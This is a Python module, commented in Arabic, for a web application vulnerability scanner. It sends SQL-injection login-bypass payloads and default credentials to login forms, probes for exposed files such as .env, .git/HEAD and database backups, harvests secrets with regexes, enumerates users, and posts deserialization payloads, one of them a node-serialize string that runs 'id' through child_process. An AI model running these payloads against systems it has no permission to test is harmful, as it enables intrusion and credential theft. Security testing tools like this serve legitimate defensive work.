#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
وحدة فحص ثغرات التطبيقات
تتضمن فحوصات لثغرات التطبيقات مثل Authentication Bypass و Information Disclosure وغيرها
"""

import re
import requests
import urllib.parse
import json
from bs4 import BeautifulSoup
from .base_scanner import VulnerabilityScanner

class ApplicationVulnerabilityScanner(VulnerabilityScanner):
    """فاحص ثغرات التطبيقات"""
    
    def __init__(self, config=None):
        """تهيئة الفاحص"""
        super().__init__(config)
        self.user_agent = self.config.get('user_agent', 'UltimateScan/1.0')
        self.headers = {
            'User-Agent': self.user_agent,
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
        }
        
    def get_description(self):
        """الحصول على وصف الفاحص"""
        return "فاحص ثغرات التطبيقات الشامل"
    
    def get_supported_vulnerabilities(self):
        """الحصول على قائمة الثغرات المدعومة"""
        return [
            'Authentication Bypass',
            'Information Disclosure',
            'Security Misconfiguration',
            'Sensitive Data Exposure',
            'Insufficient Logging and Monitoring',
            'Business Logic Flaws',
            'Race Condition',
            'Race Condition Exploits in Blockchain',
            'Insecure Deserialization',
            'API Security Issues',
            'Mobile App Security',
            'Browser Exploits',
            'User Enumeration',
            'Password Spraying and Brute Force'
        ]
    
    def scan(self, target, progress=None):
        """فحص الهدف للثغرات"""
        vulnerabilities = []
        
        # الحصول على عنوان URL للهدف
        if target.get_hostname():
            base_url = f"http://{target.get_hostname()}"
            if 443 in target.get_ports() and target.get_ports()[443] == 'open':
                base_url = f"https://{target.get_hostname()}"
        else:
            base_url = f"http://{target.get_ip()}"
            if 443 in target.get_ports() and target.get_ports()[443] == 'open':
                base_url = f"https://{target.get_ip()}"
        
        # فحص ثغرات التطبيقات
        try:
            # فحص Authentication Bypass
            auth_vulns = self._check_authentication_bypass(base_url)
            vulnerabilities.extend(auth_vulns)
            
            # فحص Information Disclosure
            info_vulns = self._check_information_disclosure(base_url)
            vulnerabilities.extend(info_vulns)
            
            # فحص Security Misconfiguration
            misconfig_vulns = self._check_security_misconfiguration(base_url)
            vulnerabilities.extend(misconfig_vulns)
            
            # فحص Sensitive Data Exposure
            data_vulns = self._check_sensitive_data_exposure(base_url)
            vulnerabilities.extend(data_vulns)
            
            # فحص User Enumeration
            enum_vulns = self._check_user_enumeration(base_url)
            vulnerabilities.extend(enum_vulns)
            
            # فحص Insecure Deserialization
            deserial_vulns = self._check_insecure_deserialization(base_url)
            vulnerabilities.extend(deserial_vulns)
            
        except Exception as e:
            if self.verbose:
                print(f"خطأ في فحص ثغرات التطبيقات: {str(e)}")
        
        # إضافة الثغرات إلى الهدف
        for vuln in vulnerabilities:
            target.add_vulnerability(vuln)
        
        return vulnerabilities
    
    def _make_request(self, url, method='GET', data=None, params=None, headers=None, follow_redirects=True):
        """إجراء طلب HTTP"""
        try:
            req_headers = self.headers.copy()
            if headers:
                req_headers.update(headers)
                
            if method.upper() == 'GET':
                response = requests.get(
                    url,
                    params=params,
                    headers=req_headers,
                    timeout=self.timeout,
                    verify=False,
                    allow_redirects=follow_redirects
                )
            elif method.upper() == 'POST':
                response = requests.post(
                    url,
                    data=data,
                    headers=req_headers,
                    timeout=self.timeout,
                    verify=False,
                    allow_redirects=follow_redirects
                )
            else:
                return None
            
            return response
        except Exception as e:
            if self.verbose:
                print(f"خطأ في إجراء طلب HTTP: {str(e)}")
            return None
    
    def _check_authentication_bypass(self, base_url):
        """فحص ثغرة Authentication Bypass"""
        vulnerabilities = []
        
        # قائمة بالمسارات المحتملة
        paths = [
            '/login', '/admin', '/admin/login', '/administrator', '/wp-admin',
            '/admin/index.php', '/admin/admin.php', '/admin/account.php',
            '/administrator/index.php', '/administrator/admin.php', '/administrator/account.php',
            '/wp-login.php', '/login.php', '/auth', '/auth/login', '/auth.php'
        ]
        
        # قائمة بحمولات Authentication Bypass
        payloads = [
            {'username': 'admin', 'password': "' OR '1'='1"},
            {'username': "' OR '1'='1", 'password': "' OR '1'='1"},
            {'username': "admin' --", 'password': "anything"},
            {'username': "admin'#", 'password': "anything"},
            {'username': "admin", 'password': "admin"},
            {'username': "administrator", 'password': "administrator"},
            {'username': "admin", 'password': "password"},
            {'username': "admin", 'password': "123456"}
        ]
        
        # قائمة بأنماط الاستجابة التي تشير إلى نجاح الحقن
        success_patterns = [
            'welcome', 'dashboard', 'logout', 'profile', 'account', 'admin', 'administrator',
            'successfully', 'success', 'logged in', 'authenticated'
        ]
        
        # فحص كل مسار
        for path in paths:
            url = f"{base_url}{path}"
            
            # التحقق من وجود صفحة تسجيل الدخول
            response = self._make_request(url)
            
            if response and response.status_code == 200:
                # البحث عن نموذج تسجيل الدخول
                soup = BeautifulSoup(response.text, 'html.parser')
                login_form = None
                
                for form in soup.find_all('form'):
                    inputs = form.find_all('input')
                    input_names = [inp.get('name', '').lower() for inp in inputs if inp.get('name')]
                    
                    if any(name in ['username', 'user', 'email', 'login', 'userid'] for name in input_names) and \
                       any(name in ['password', 'pass', 'pwd'] for name in input_names):
                        login_form = form
                        break
                
                if login_form:
                    # تحديد طريقة النموذج والعمل
                    method = login_form.get('method', 'post').upper()
                    action = login_form.get('action', '')
                    
                    # تحديد عنوان URL للإرسال
                    if action:
                        if action.startswith('http'):
                            form_url = action
                        elif action.startswith('/'):
                            form_url = f"{base_url}{action}"
                        else:
                            form_url = f"{url}/{action}"
                    else:
                        form_url = url
                    
                    # تحديد أسماء حقول النموذج
                    username_field = None
                    password_field = None
                    
                    for inp in login_form.find_all('input'):
                        name = inp.get('name', '').lower()
                        if name in ['username', 'user', 'email', 'login', 'userid']:
                            username_field = inp.get('name')
                        elif name in ['password', 'pass', 'pwd']:
                            password_field = inp.get('name')
                    
                    if username_field and password_field:
                        # تجربة حمولات Authentication Bypass
                        for payload in payloads:
                            form_data = {}
                            
                            # إضافة حقول النموذج الأخرى
                            for inp in login_form.find_all('input'):
                                if inp.get('name') and inp.get('name') not in [username_field, password_field] and inp.get('type') != 'submit':
                                    form_data[inp.get('name')] = inp.get('value', '')
                            
                            # إضافة حقول اسم المستخدم وكلمة المرور
                            form_data[username_field] = payload['username']
                            form_data[password_field] = payload['password']
                            
                            # إرسال النموذج
                            if method == 'GET':
                                response = self._make_request(form_url, method='GET', params=form_data)
                            else:
                                response = self._make_request(form_url, method='POST', data=form_data)
                            
                            if response:
                                # التحقق من نجاح تسجيل الدخول
                                for pattern in success_patterns:
                                    if pattern.lower() in response.text.lower() or \
                                       'dashboard' in response.url.lower() or \
                                       'admin' in response.url.lower() or \
                                       'account' in response.url.lower() or \
                                       'profile' in response.url.lower():
                                        vuln = self.create_vulnerability(
                                            vuln_type='Authentication Bypass',
                                            severity='critical',
                                            description='الموقع معرض لثغرة تجاوز المصادقة',
                                            location={
                                                'url': url,
                                                'form_url': form_url,
                                                'username_field': username_field,
                                                'password_field': password_field
                                            },
                                            exploit_info={
                                                'payload': payload,
                                                'method': method,
                                                'form_data': form_data
                                            },
                                            recommendation='تنقية مدخلات المستخدم واستخدام آليات مصادقة آمنة',
                                            references=[
                                                'https://owasp.org/www-project-top-ten/2017/A2_2017-Broken_Authentication',
                                                'https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html'
                                            ]
                                        )
                                        vulnerabilities.append(vuln)
                                        break
        
        return vulnerabilities
    
    def _check_information_disclosure(self, base_url):
        """فحص ثغرة Information Disclosure"""
        vulnerabilities = []
        
        # قائمة بالمسارات المحتملة
        paths = [
            '/robots.txt', '/sitemap.xml', '/.git/HEAD', '/.svn/entries',
            '/.env', '/config.php', '/config.js', '/config.json', '/config.xml',
            '/phpinfo.php', '/info.php', '/test.php', '/server-status',
            '/server-info', '/.htaccess', '/web.config', '/backup', '/backup.zip',
            '/backup.tar.gz', '/backup.sql', '/db.sql', '/database.sql',
            '/wp-config.php', '/wp-config.bak', '/config.bak', '/debug.log',
            '/error.log', '/access.log', '/credentials.txt', '/passwords.txt'
        ]
        
        # قائمة بأنماط الاستجابة التي تشير إلى تسريب المعلومات
        patterns = {
            'api_key': r'api[_-]key["\']?\s*[:=]\s*["\']([a-zA-Z0-9_\-\.]+)["\']',
            'password': r'password["\']?\s*[:=]\s*["\']([^"\']+)["\']',
            'secret': r'secret["\']?\s*[:=]\s*["\']([^"\']+)["\']',
            'token': r'token["\']?\s*[:=]\s*["\']([^"\']+)["\']',
            'database': r'database["\']?\s*[:=]\s*["\']([^"\']+)["\']',
            'db_password': r'db[_-]password["\']?\s*[:=]\s*["\']([^"\']+)["\']',
            'phpinfo': r'<title>phpinfo\(\)</title>',
            'git': r'ref: refs/heads/master',
            'svn': r'dir\n',
            'env': r'APP_ENV|DB_HOST|DB_USERNAME|DB_PASSWORD',
            'error': r'Fatal error|Warning|Notice|Stack trace|Exception'
        }
        
        # فحص كل مسار
        for path in paths:
            url = f"{base_url}{path}"
            
            # إرسال الطلب
            response = self._make_request(url)
            
            if response and response.status_code == 200:
                # التحقق من وجود أنماط تسريب المعلومات
                for pattern_name, pattern in patterns.items():
                    matches = re.findall(pattern, response.text)
                    
                    if matches:
                        vuln = self.create_vulnerability(
                            vuln_type='Information Disclosure',
                            severity='high',
                            description=f'الموقع يسرب معلومات حساسة: {pattern_name}',
                            location={
                                'url': url
                            },
                            exploit_info={
                                'matches': matches[:5],  # أول 5 تطابقات فقط
                                'method': 'GET'
                            },
                            recommendation='إزالة الملفات الحساسة من الخادم وتكوين الخادم لمنع الوصول إلى الملفات الحساسة',
                            references=[
                                'https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure',
                                'https://www.acunetix.com/vulnerabilities/web/information-disclosure/'
                            ]
                        )
                        vulnerabilities.append(vuln)
                        break
        
        return vulnerabilities
    
    def _check_security_misconfiguration(self, base_url):
        """فحص ثغرة Security Misconfiguration"""
        vulnerabilities = []
        
        # قائمة بالمسارات المحتملة
        paths = [
            '/admin', '/administrator', '/wp-admin', '/phpmyadmin', '/mysql',
            '/myadmin', '/manager/html', '/console', '/wp-json', '/api',
            '/api/v1', '/api/v2', '/swagger', '/swagger-ui.html', '/swagger-ui',
            '/actuator', '/actuator/health', '/actuator/info', '/actuator/env',
            '/metrics', '/status', '/debug', '/trace', '/dump', '/env',
            '/logfile', '/log', '/logs', '/tmp', '/temp', '/test'
        ]
        
        # فحص كل مسار
        for path in paths:
            url = f"{base_url}{path}"
            
            # إرسال الطلب
            response = self._make_request(url)
            
            if response and response.status_code in [200, 301, 302, 401, 403]:
                # التحقق من وجود صفحات إدارية أو تكوينية
                if response.status_code in [200, 401, 403]:
                    vuln = self.create_vulnerability(
                        vuln_type='Security Misconfiguration',
                        severity='medium',
                        description=f'تم اكتشاف صفحة إدارية أو تكوينية: {path}',
                        location={
                            'url': url,
                            'status_code': response.status_code
                        },
                        recommendation='تقييد الوصول إلى الصفحات الإدارية والتكوينية',
                        references=[
                            'https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration',
                            'https://www.acunetix.com/vulnerabilities/web/security-misconfiguration/'
                        ]
                    )
                    vulnerabilities.append(vuln)
        
        # فحص رؤوس CORS
        response = self._make_request(base_url)
        
        if response:
            cors_headers = [
                'Access-Control-Allow-Origin',
                'Access-Control-Allow-Credentials',
                'Access-Control-Allow-Methods',
                'Access-Control-Allow-Headers'
            ]
            
            for header in cors_headers:
                value = response.headers.get(header)
                
                if value and (value == '*' or 'null' in value):
                    vuln = self.create_vulnerability(
                        vuln_type='CORS Misconfiguration',
                        severity='medium',
                        description=f'تكوين CORS غير آمن: {header}: {value}',
                        location={
                            'url': base_url,
                            'header': header,
                            'value': value
                        },
                        recommendation='تكوين رؤوس CORS بشكل صحيح لتقييد الوصول عبر المواقع',
                        references=[
                            'https://portswigger.net/web-security/cors',
                            'https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/07-Testing_Cross_Origin_Resource_Sharing'
                        ]
                    )
                    vulnerabilities.append(vuln)
        
        return vulnerabilities
    
    def _check_sensitive_data_exposure(self, base_url):
        """فحص ثغرة Sensitive Data Exposure"""
        vulnerabilities = []
        
        # فحص استخدام HTTPS
        if base_url.startswith('http://'):
            vuln = self.create_vulnerability(
                vuln_type='Sensitive Data Exposure',
                severity='high',
                description='الموقع لا يستخدم HTTPS لنقل البيانات',
                location={
                    'url': base_url
                },
                recommendation='تفعيل HTTPS لجميع صفحات الموقع',
                references=[
                    'https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure',
                    'https://cheatsheetseries.owasp.org/cheatsheets/Transport_Layer_Protection_Cheat_Sheet.html'
                ]
            )
            vulnerabilities.append(vuln)
        
        # فحص تسريب البيانات الحساسة في صفحات الموقع
        response = self._make_request(base_url)
        
        if response:
            # قائمة بأنماط البيانات الحساسة
            patterns = {
                'credit_card': r'\b(?:4[0-9]{12}(?:[0-9]{3})?|5[1-5][0-9]{14}|3[47][0-9]{13}|3(?:0[0-5]|[68][0-9])[0-9]{11}|6(?:011|5[0-9]{2})[0-9]{12}|(?:2131|1800|35\d{3})\d{11})\b',
                'email': r'\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b',
                'ssn': r'\b\d{3}-\d{2}-\d{4}\b',
                'phone': r'\b(?:\+\d{1,2}\s)?\(?\d{3}\)?[\s.-]?\d{3}[\s.-]?\d{4}\b',
                'password': r'\bpassword\s*[=:]\s*[\'"][^\'"]+[\'"]\b',
                'api_key': r'\bapi[_-]?key\s*[=:]\s*[\'"][^\'"]+[\'"]\b'
            }
            
            for pattern_name, pattern in patterns.items():
                matches = re.findall(pattern, response.text)
                
                if matches:
                    vuln = self.create_vulnerability(
                        vuln_type='Sensitive Data Exposure',
                        severity='high',
                        description=f'الموقع يعرض بيانات حساسة: {pattern_name}',
                        location={
                            'url': base_url
                        },
                        recommendation='إزالة البيانات الحساسة من صفحات الموقع',
                        references=[
                            'https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure',
                            'https://cheatsheetseries.owasp.org/cheatsheets/Sensitive_Data_Exposure_Cheat_Sheet.html'
                        ]
                    )
                    vulnerabilities.append(vuln)
        
        return vulnerabilities
    
    def _check_user_enumeration(self, base_url):
        """فحص ثغرة User Enumeration"""
        vulnerabilities = []
        
        # قائمة بالمسارات المحتملة
        paths = [
            '/login', '/admin', '/admin/login', '/administrator', '/wp-admin',
            '/admin/index.php', '/admin/admin.php', '/admin/account.php',
            '/administrator/index.php', '/administrator/admin.php', '/administrator/account.php',
            '/wp-login.php', '/login.php', '/auth', '/auth/login', '/auth.php',
            '/register', '/signup', '/forgot-password', '/reset-password',
            '/forgot_password', '/reset_password', '/password-reset', '/password_reset'
        ]
        
        # قائمة بأسماء المستخدمين للاختبار
        usernames = ['admin', 'administrator', 'test', 'user', 'guest', 'info', 'root']
        
        # فحص كل مسار
        for path in paths:
            url = f"{base_url}{path}"
            
            # التحقق من وجود صفحة تسجيل الدخول أو إعادة تعيين كلمة المرور
            response = self._make_request(url)
            
            if response and response.status_code == 200:
                # البحث عن نموذج
                soup = BeautifulSoup(response.text, 'html.parser')
                form = None
                
                for f in soup.find_all('form'):
                    inputs = f.find_all('input')
                    input_names = [inp.get('name', '').lower() for inp in inputs if inp.get('name')]
                    
                    if any(name in ['username', 'user', 'email', 'login', 'userid'] for name in input_names):
                        form = f
                        break
                
                if form:
                    # تحديد طريقة النموذج والعمل
                    method = form.get('method', 'post').upper()
                    action = form.get('action', '')
                    
                    # تحديد عنوان URL للإرسال
                    if action:
                        if action.startswith('http'):
                            form_url = action
                        elif action.startswith('/'):
                            form_url = f"{base_url}{action}"
                        else:
                            form_url = f"{url}/{action}"
                    else:
                        form_url = url
                    
                    # تحديد اسم حقل اسم المستخدم
                    username_field = None
                    
                    for inp in form.find_all('input'):
                        name = inp.get('name', '').lower()
                        if name in ['username', 'user', 'email', 'login', 'userid']:
                            username_field = inp.get('name')
                            break
                    
                    if username_field:
                        # تجربة أسماء المستخدمين المختلفة
                        responses = {}
                        
                        for username in usernames:
                            form_data = {}
                            
                            # إضافة حقول النموذج الأخرى
                            for inp in form.find_all('input'):
                                if inp.get('name') and inp.get('name') != username_field and inp.get('type') != 'submit':
                                    form_data[inp.get('name')] = inp.get('value', '')
                            
                            # إضافة حقل اسم المستخدم
                            form_data[username_field] = username
                            
                            # إرسال النموذج
                            if method == 'GET':
                                response = self._make_request(form_url, method='GET', params=form_data)
                            else:
                                response = self._make_request(form_url, method='POST', data=form_data)
                            
                            if response:
                                responses[username] = {
                                    'status_code': response.status_code,
                                    'content_length': len(response.text),
                                    'text': response.text
                                }
                        
                        # تحليل الاستجابات للكشف عن تعداد المستخدمين
                        if len(responses) > 1:
                            # التحقق من اختلاف الاستجابات
                            content_lengths = [resp['content_length'] for resp in responses.values()]
                            status_codes = [resp['status_code'] for resp in responses.values()]
                            
                            if len(set(content_lengths)) > 1 or len(set(status_codes)) > 1:
                                vuln = self.create_vulnerability(
                                    vuln_type='User Enumeration',
                                    severity='medium',
                                    description='الموقع معرض لثغرة تعداد المستخدمين',
                                    location={
                                        'url': url,
                                        'form_url': form_url,
                                        'username_field': username_field
                                    },
                                    exploit_info={
                                        'method': method,
                                        'differences': {
                                            username: {
                                                'status_code': resp['status_code'],
                                                'content_length': resp['content_length']
                                            } for username, resp in responses.items()
                                        }
                                    },
                                    recommendation='توحيد رسائل الخطأ وعدم الكشف عن وجود أو عدم وجود اسم المستخدم',
                                    references=[
                                        'https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/03-Identity_Management_Testing/04-Testing_for_Account_Enumeration_and_Guessable_User_Account',
                                        'https://www.acunetix.com/vulnerabilities/web/user-enumeration/'
                                    ]
                                )
                                vulnerabilities.append(vuln)
        
        return vulnerabilities
    
    def _check_insecure_deserialization(self, base_url):
        """فحص ثغرة Insecure Deserialization"""
        vulnerabilities = []
        
        # قائمة بالمسارات المحتملة
        paths = [
            '/api', '/api/v1', '/api/v2', '/rest', '/rest/v1', '/rest/v2',
            '/data', '/object', '/serialize', '/deserialize', '/json', '/xml',
            '/rpc', '/soap', '/action', '/process', '/exec', '/run'
        ]
        
        # قائمة بحمولات Insecure Deserialization
        payloads = [
            {'content': 'O:8:"stdClass":0:{}', 'content_type': 'application/x-php-serialized'},
            {'content': '<![CDATA[<?php echo(\'XSS\'); ?>]]>', 'content_type': 'application/xml'},
            {'content': '{"rce":"_$$ND_FUNC$$_function(){require(\'child_process\').exec(\'id\');}()"}', 'content_type': 'application/json'},
            {'content': '{"constructor":{"prototype":{"toString":"_$$ND_FUNC$$_function(){return \'XSS\';}"}}}', 'content_type': 'application/json'}
        ]
        
        # قائمة بأنماط الاستجابة التي تشير إلى نجاح الحقن
        patterns = [
            'uid=', 'gid=', 'groups=', 'Exception', 'Error', 'Warning',
            'Unserialize', 'Deserialize', 'Parse', 'Syntax', 'eval'
        ]
        
        # فحص كل مسار
        for path in paths:
            url = f"{base_url}{path}"
            
            # تجربة كل حمولة
            for payload in payloads:
                # إرسال الطلب
                headers = {'Content-Type': payload['content_type']}
                response = self._make_request(url, method='POST', data=payload['content'], headers=headers)
                
                if response:
                    # التحقق من وجود أنماط الاستجابة
                    for pattern in patterns:
                        if pattern in response.text:
                            vuln = self.create_vulnerability(
                                vuln_type='Insecure Deserialization',
                                severity='high',
                                description='الموقع معرض لثغرة Insecure Deserialization',
                                location={
                                    'url': url
                                },
                                exploit_info={
                                    'payload': payload['content'],
                                    'content_type': payload['content_type'],
                                    'method': 'POST'
                                },
                                recommendation='تجنب استخدام التسلسل والتفكيك غير الآمن للبيانات',
                                references=[
                                    'https://owasp.org/www-project-top-ten/2017/A8_2017-Insecure_Deserialization',
                                    'https://portswigger.net/web-security/deserialization'
                                ]
                            )
                            vulnerabilities.append(vuln)
                            break
        
        return vulnerabilities
